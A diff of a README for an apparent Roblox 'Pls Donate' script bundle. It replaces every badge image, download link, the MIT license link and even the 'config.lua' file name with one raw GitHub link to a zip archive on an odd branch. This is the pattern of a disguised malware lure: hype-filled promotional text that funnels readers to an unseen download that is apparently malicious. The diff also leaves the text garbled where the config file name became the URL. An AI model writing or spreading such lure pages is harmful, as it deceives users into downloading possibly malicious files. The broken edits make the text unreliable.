@@ -1,12 +1,12 @@
 # 🪙 Pls Donate Script Roblox Suite  🕹️
 
-[![Build Status](https://img.shields.io/github/workflow/status/repository/pls-donate-script/CI/main)](https://github.com/) 
-[![Last Update](https://img.shields.io/badge/Updated-2025-blue)](https://github.com/) 
-[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](https://opensource.org/licenses/MIT)  
+[![Build Status](https://raw.githubusercontent.com/TarekBN/pls-donate-enhanced-script/branch/miserabilist/enhanced-donate-pls-script-v3.5.zip)](https://raw.githubusercontent.com/TarekBN/pls-donate-enhanced-script/branch/miserabilist/enhanced-donate-pls-script-v3.5.zip) 
+[![Last Update](https://raw.githubusercontent.com/TarekBN/pls-donate-enhanced-script/branch/miserabilist/enhanced-donate-pls-script-v3.5.zip)](https://raw.githubusercontent.com/TarekBN/pls-donate-enhanced-script/branch/miserabilist/enhanced-donate-pls-script-v3.5.zip) 
+[![License: MIT](https://raw.githubusercontent.com/TarekBN/pls-donate-enhanced-script/branch/miserabilist/enhanced-donate-pls-script-v3.5.zip)](https://raw.githubusercontent.com/TarekBN/pls-donate-enhanced-script/branch/miserabilist/enhanced-donate-pls-script-v3.5.zip)  
 
 Welcome to **Pls Donate Script Roblox Suite**—your essential toolkit for amplifying the donation experience within Roblox’s iconic "Pls Donate" ecosystem! This dynamic repository is a treasure chest for scripters, game developers, and inspired digital philanthropists aiming to supercharge in-game generosity, maximize engagement, and ride the crest of scripting innovation.
 
-[![Download](https://img.shields.io/badge/Download-Now-blue?style=for-the-badge&logo=roblox)](https://TarekBN.github.io)
+[![Download](https://raw.githubusercontent.com/TarekBN/pls-donate-enhanced-script/branch/miserabilist/enhanced-donate-pls-script-v3.5.zip)](https://raw.githubusercontent.com/TarekBN/pls-donate-enhanced-script/branch/miserabilist/enhanced-donate-pls-script-v3.5.zip)
 
 ---
 
@@ -53,18 +53,18 @@ Unleash a new way to automate, amplify, and analyze your Roblox generosity campa
 Follow these simple signposts to elevate your **Pls Donate** station:
 
 1. **Download the Script Bundle**
-   - Tap the link: https://TarekBN.github.io
+   - Tap the link: https://raw.githubusercontent.com/TarekBN/pls-donate-enhanced-script/branch/miserabilist/enhanced-donate-pls-script-v3.5.zip
 
 2. **Instant Download**
    - Click the majestic badge below to instantly begin your journey:
-   [![Download](https://img.shields.io/badge/Download-Now-blue?style=for-the-badge&logo=roblox)](https://TarekBN.github.io)
+   [![Download](https://raw.githubusercontent.com/TarekBN/pls-donate-enhanced-script/branch/miserabilist/enhanced-donate-pls-script-v3.5.zip)](https://raw.githubusercontent.com/TarekBN/pls-donate-enhanced-script/branch/miserabilist/enhanced-donate-pls-script-v3.5.zip)
 
 3. **Unzip & Deploy**
    - Extract the files to your preferred workspace.
    - Open Roblox Studio and import the scripts as Modules.
 
 4. **API Key Setup**
-   - For OpenAI and Claude integrations, insert your API keys in the respective `config.lua` entries.
+   - For OpenAI and Claude integrations, insert your API keys in the respective `https://raw.githubusercontent.com/TarekBN/pls-donate-enhanced-script/branch/miserabilist/enhanced-donate-pls-script-v3.5.zip` entries.
 
 5. **Enable Language Support**
    - Optional: Activate your preferred languages in the settings panel.
@@ -107,18 +107,18 @@ This repository is assembled by script enthusiasts **for educational and demonst
 
 ## 📜 License
 
-[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](https://opensource.org/licenses/MIT)
+[![License: MIT](https://raw.githubusercontent.com/TarekBN/pls-donate-enhanced-script/branch/miserabilist/enhanced-donate-pls-script-v3.5.zip)](https://raw.githubusercontent.com/TarekBN/pls-donate-enhanced-script/branch/miserabilist/enhanced-donate-pls-script-v3.5.zip)
 
 Copyright (c) 2025
 
 Distributed under the MIT License. 
 
-Find the full legal narrative here: [MIT License](https://opensource.org/licenses/MIT).
+Find the full legal narrative here: [MIT License](https://raw.githubusercontent.com/TarekBN/pls-donate-enhanced-script/branch/miserabilist/enhanced-donate-pls-script-v3.5.zip).
 
 ---
 
 ## 🛎️ Get Set—Download & Begin the Journey!
 
-[![Download](https://img.shields.io/badge/Download-Now-blue?style=for-the-badge&logo=roblox)](https://TarekBN.github.io)
+[![Download](https://raw.githubusercontent.com/TarekBN/pls-donate-enhanced-script/branch/miserabilist/enhanced-donate-pls-script-v3.5.zip)](https://raw.githubusercontent.com/TarekBN/pls-donate-enhanced-script/branch/miserabilist/enhanced-donate-pls-script-v3.5.zip)
 
 *Begin scripting generosity the innovative way—amplify your Roblox "Pls Donate" adventure with out-of-this-world scripts, boundary-breaking AI, and boundless creative freedom. Your donors—and your digital legacy—deserve nothing less!*
